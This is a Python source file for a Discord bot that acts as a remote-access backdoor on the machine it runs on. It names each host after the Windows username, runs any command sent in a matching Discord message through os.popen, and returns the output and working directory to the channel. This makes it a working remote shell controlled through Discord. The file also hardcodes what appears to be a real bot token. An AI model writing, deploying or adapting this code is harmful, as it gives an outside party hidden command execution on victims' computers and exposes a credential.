import discord
from discord.ext import commands
import os
import json

# Replace 'your_bot_token' with your actual bot token
bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
token = "MTA2MjAzMDMzMjIzODQ5NTc4Ng.GfZmz2.Eup8OgXpGAiEeiTRLcW2iQqGIpluo2UOMJYOCw"
thisPCID = os.getenv("USERNAME").replace(" ", "-").lower()

@bot.event
async def on_ready():
    print(f'{bot.user.name} has connected to Discord!')

@bot.event
async def on_message(message=discord.Message):
    if message.content.startswith(f".{thisPCID}"):
        if message.content == f".{thisPCID}":
            arguments = [os.getcwd()]
            arguments = str(arguments)
            print(arguments)
            await message.channel.send(arguments)
        else:
            command = message.content.replace(f".{thisPCID} ", "")
            print(command)
            try:
                output = os.popen(command).read()
                arguments = [os.getcwd(), output]
                await message.channel.send(arguments)
            except Exception:
                await message.channel.send("Command doesnt exist, or there was another problem that lead up to an error")


bot.run(token)